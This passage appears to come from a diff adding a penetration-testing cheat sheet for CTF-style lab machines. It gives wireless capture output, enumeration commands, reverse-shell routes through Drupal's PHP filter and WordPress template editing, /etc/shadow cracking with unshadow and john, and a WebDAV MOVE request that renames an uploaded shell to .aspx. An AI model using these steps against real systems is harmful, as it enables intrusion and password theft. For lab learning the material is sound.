+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.991250</span> <span class="n">Authentication</span> <span class="p">(</span><span class="n">Open</span> <span class="n">System</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="n">Successful</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.992274</span> <span class="n">Authentication</span> <span class="p">(</span><span class="n">Open</span> <span class="n">System</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="n">Successful</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.992282</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.992795</span> <span class="n">Authentication</span> <span class="p">(</span><span class="n">Open</span> <span class="n">System</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">:</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.992787</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.994834</span> <span class="n">Assoc</span> <span class="n">Request</span> <span class="p">(</span><span class="n">community</span><span class="p">)</span> <span class="p">[</span><span class="mf">1.0</span><span class="o">*</span> <span class="mf">2.0</span><span class="o">*</span> <span class="mf">5.5</span><span class="o">*</span> <span class="mf">11.0</span><span class="o">*</span> <span class="mf">18.0</span> <span class="mf">24.0</span> <span class="mf">36.0</span> <span class="mf">54.0</span> <span class="n">Mbit</span><span class="p">]</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.994843</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.996890</span> <span class="n">Assoc</span> <span class="n">Response</span> <span class="n">AID</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">:</span> <span class="n">PRIVACY</span> <span class="p">:</span> <span class="n">Successful</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.996882</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.011783</span> <span class="n">Action</span> <span class="p">(</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">BA</span> <span class="n">ADDBA</span> <span class="n">Response</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.012314</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.012827</span> <span class="n">BAR</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span> <span class="n">TA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span> <span class="n">CTL</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="n">SEQ</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.013330</span> <span class="n">BA</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.014874</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v2</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">117</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.015379</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.030226</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v1</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">117</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.030746</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.043034</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v2</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">175</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.043026</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.054803</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v1</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">95</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.056338</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v1</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">95</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.056859</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.064514</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.065030</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.079878</span> <span class="n">Clear</span><span class="o">-</span><span class="n">To</span><span class="o">-</span><span class="n">Send</span> <span class="n">RA</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.080901</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.108096</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.108096</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.110144</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>Transfer an image</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">base64</span> <span class="n">flair</span><span class="o">.</span><span class="n">jpg</span>
+<span class="n">Copy</span> <span class="n">output</span>
+<span class="n">vi</span> <span class="n">flair</span>
+<span class="n">Paste</span> <span class="n">the</span> <span class="n">clipboard</span>
+<span class="n">base64</span> <span class="o">-</span><span class="n">d</span> <span class="n">flair</span> <span class="o">&gt;</span> <span class="n">flair</span><span class="o">.</span><span class="n">jpg</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>Have a web-accessible git ? utilize <a class="reference external" href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a> to rip web accessible (distributed) version control systems: SVN, GIT, Mercurial/hg, bzr. It can rip repositories even when directory browsing is turned off. Eric Gruber has written a blog on <a class="reference external" href="https://blog.netspi.com/dumping-git-data-from-misconfigured-web-servers/">Dumping Git Data from Misconfigured Web Servers</a> providing good walkthru.</p></li>
+<li><p>It’s always important to find, what’s installed on the box:</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">dpkg</span><span class="o">-</span><span class="n">query</span> <span class="o">-</span><span class="n">l</span>
+</pre></div>
+</div>
+<p>or using wild cards</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">dpkg</span><span class="o">-</span><span class="n">query</span> <span class="o">-</span><span class="n">l</span> <span class="s1">&#39;perl*&#39;</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul>
+<li><p>It’s always important to note down all the passwords found during the process of exploiting a vulnerable machine as there is a great possibility that passwords would be reused.</p></li>
+<li><p>If you have .jar file, Probably use jd-gui to decompile and view the class file.</p></li>
+<li><p>Find recently modified files:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">mmin</span> <span class="o">-</span><span class="mi">10</span> <span class="o">-</span><span class="nb">type</span> <span class="n">f</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+</pre></div>
+</div>
+<p>The above will show you which files have been modified within the last 10 minutes, which could help you find out whether an important config file, or log file has been modified.</p>
+</li>
+<li><p>Getting a reverse shell from:</p></li>
+</ul>
+<blockquote>
+<div><ul>
+<li><p>Drupal: Now that we have access to the Drupal administration panel, we can gain RCE by enabling the PHP filter module. This will allow us to execute arbitrary code on the site by inserting a specifically crafted string into page content. After enabling the module, I proceed to allow code to be executed by all users under the configuration screen for the module. Once enabled we need to give permission to use it so in people -&gt; permissions check “Use the PHP code text for.</p>
+<p>Next, we create a new block (by going to Blocks, under the Structure menu) with the following content. We make sure to select PHP code from the Text format drop down. Taken from <a class="reference external" href="https://g0blin.co.uk/droopy-vulnhub-writeup/">Droopy Vulnhub WriteUp</a>
+Drupal settings file location: /var/www/html/sites/default/settings.php</p>
+</li>
+<li><p>WordPress : If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible way is to do Appearance &gt; Editor &gt; Possibly edit 404 Template.</p></li>
+</ul>
+</div></blockquote>
+<ul class="simple">
+<li><p>If the only port which is open is 3128, check for the open proxy and route the traffic via the open proxy. Probably, squid proxy server would be running. If it is the squid configuration file is /etc/squid/squid.conf</p></li>
+</ul>
+<blockquote>
+<div><ul class="simple">
+<li><p>If you do get the configuration file, do check for what kind of proxy it is! like SOCKS4, SOCKS5 or HTTP(S) proxy and is there any authentication required to access the proxy.</p></li>
+<li><p>We may utilize <a class="reference external" href="https://github.com/haad/proxychains">Proxychains</a> to access the other side of network like ssh, http etc.</p></li>
+</ul>
+</div></blockquote>
+<ul>
+<li><p>Running Asterisk/ Elastix/ FreePBX or any PBX, probably try <a class="reference external" href="https://github.com/EnableSecurity/sipvicious">SIPVicious</a>  suite is a set of tools that can be used to audit SIP based VoIP systems. Running “http:\IPpanel” should provide us valid extensions.</p></li>
+<li><p>Sharepoint running? Probably, check <a class="reference external" href="https://github.com/sensepost/SPartan">SPartan</a> Frontpage and Sharepoint fingerprinting and attack tool and <a class="reference external" href="https://github.com/0rigen/SharePwn">SharePwn</a> SharePoint Security Auditor.</p></li>
+<li><p>authbind software allows a program that would normally require superuser privileges to access privileged network services to run as a non-privileged user. authbind allows the system administrator to permit specific users and groups access to bind to TCP and UDP ports below 1024.</p></li>
+<li><p>Mostly, if there’s only port open like ssh and the IP might be acting as a interface between two networks? Like IT and OT. Probably, try to add that IP address as a default route? As it might be acting as a router?</p></li>
+<li><p>If you are trying to figure out the hostname of the machine and the DNS-Server is not configured, may be try to do a Full Nmap Scan -A Option? (Still need to figure out how does that work)</p></li>
+<li><p>Want to send a email via the SMTP server something like SMTP-Open-Relay utilize <a class="reference external" href="http://www.jetmore.org/john/code/swaks/">Swaks</a> Swiss Army Knife for SMTP.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">swaks</span> <span class="o">--</span><span class="n">to</span> <span class="n">xxxxx</span><span class="nd">@example</span><span class="o">.</span><span class="n">com</span> <span class="o">--</span><span class="kn">from</span> <span class="nn">xxxxxee</span><span class="nd">@example</span><span class="o">.</span><span class="n">edu</span> <span class="o">--</span><span class="n">server</span> <span class="mf">192.168.110.105</span><span class="p">:</span><span class="mi">2525</span> <span class="o">--</span><span class="n">body</span> <span class="s2">&quot;Hey Buddy How are you doing&quot;</span> <span class="o">--</span><span class="n">header</span> <span class="s2">&quot;Subject: Hello! Long time&quot;</span>
+</pre></div>
+</div>
+</li>
+<li><p>Got /etc/shadow file?, utilize /etc/passwd with unshadow command and use john or cudahashcat to crack passwords.</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">unshadow</span> <span class="n">passwd</span> <span class="n">shadown</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>If IIS and WebDav with PUT and MOVE method are enabled, we can use testdav or cadaver (A command-line WebDAV client for Unix) to see which files are allowed</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">davtest</span> <span class="o">-</span><span class="n">url</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span>
+<span class="o">********************************************************</span>
+ <span class="n">Testing</span> <span class="n">DAV</span> <span class="n">connection</span>
+<span class="n">OPEN</span>          <span class="n">SUCCEED</span><span class="p">:</span>                <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span>
+<span class="o">********************************************************</span>
+<span class="n">NOTE</span>  <span class="n">Random</span> <span class="n">string</span> <span class="k">for</span> <span class="n">this</span> <span class="n">session</span><span class="p">:</span> <span class="n">E3u9ISnNswYes0</span>
+<span class="o">********************************************************</span>
+ <span class="n">Creating</span> <span class="n">directory</span>
+<span class="n">MKCOL</span>         <span class="n">SUCCEED</span><span class="p">:</span>                <span class="n">Created</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span>
+<span class="o">********************************************************</span>
+ <span class="n">Sending</span> <span class="n">test</span> <span class="n">files</span>
+<span class="n">PUT</span>   <span class="n">pl</span>      <span class="n">SUCCEED</span><span class="p">:</span>        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">pl</span>
+<span class="n">PUT</span>   <span class="n">asp</span>     <span class="n">FAIL</span>
+<span class="n">PUT</span>   <span class="n">aspx</span>    <span class="n">FAIL</span>
+<span class="n">PUT</span>   <span class="n">cgi</span>     <span class="n">FAIL</span>
+<span class="n">PUT</span>   <span class="n">html</span>    <span class="n">SUCCEED</span><span class="p">:</span>        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">html</span>
+<span class="n">PUT</span>   <span class="n">cfm</span>     <span class="n">SUCCEED</span><span class="p">:</span>        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">cfm</span>
+<span class="n">PUT</span>   <span class="n">jhtml</span>   <span class="n">SUCCEED</span><span class="p">:</span>        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">jhtml</span>
+<span class="n">PUT</span>   <span class="n">shtml</span>   <span class="n">FAIL</span>
+<span class="n">PUT</span>   <span class="n">php</span>     <span class="n">SUCCEED</span><span class="p">:</span>        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">php</span>
+<span class="n">PUT</span>   <span class="n">jsp</span>     <span class="n">SUCCEED</span><span class="p">:</span>        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">jsp</span>
+<span class="n">PUT</span>   <span class="n">txt</span>     <span class="n">SUCCEED</span><span class="p">:</span>        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">txt</span>
+<span class="o">********************************************************</span>
+ <span class="n">Checking</span> <span class="k">for</span> <span class="n">test</span> <span class="n">file</span> <span class="n">execution</span>
+<span class="n">EXEC</span>  <span class="n">pl</span>      <span class="n">FAIL</span>
+<span class="n">EXEC</span>  <span class="n">html</span>    <span class="n">SUCCEED</span><span class="p">:</span>        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">html</span>
+<span class="n">EXEC</span>  <span class="n">cfm</span>     <span class="n">FAIL</span>
+<span class="n">EXEC</span>  <span class="n">jhtml</span>   <span class="n">FAIL</span>
+<span class="n">EXEC</span>  <span class="n">php</span>     <span class="n">FAIL</span>
+<span class="n">EXEC</span>  <span class="n">jsp</span>     <span class="n">FAIL</span>
+<span class="n">EXEC</span>  <span class="n">txt</span>     <span class="n">SUCCEED</span><span class="p">:</span>        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">txt</span>
+
+<span class="o">********************************************************</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">davtest</span> <span class="n">Summary</span><span class="p">:</span>
+<span class="n">Created</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span>
+<span class="n">PUT</span> <span class="n">File</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">pl</span>
+<span class="n">PUT</span> <span class="n">File</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">html</span>
+<span class="n">PUT</span> <span class="n">File</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">cfm</span>
+<span class="n">PUT</span> <span class="n">File</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">jhtml</span>
+<span class="n">PUT</span> <span class="n">File</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">php</span>
+<span class="n">PUT</span> <span class="n">File</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">jsp</span>
+<span class="n">PUT</span> <span class="n">File</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">Executes</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">html</span>
+<span class="n">Executes</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">txt</span>
+</pre></div>
+</div>
+<p>Now, we can see that pl, html, txt and other files can be uploaded. Now, if the MOVE method is enabled, we can upload a aspx meterpreter in a text file and then MOVE the .txt file to .aspx and execute the aspx file by using</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">MOVE</span> <span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">txt</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="n">Host</span><span class="p">:</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span>
+<span class="n">Destination</span><span class="p">:</span> <span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">aspx</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul>
+<li><p>In one of the VM, one of the task was to capture the RAM of the system by using LiME ~ Linux Memory Extractor ( which is executed by suid binary with root privileges ). Let’s say the ramdump was saved at</p>
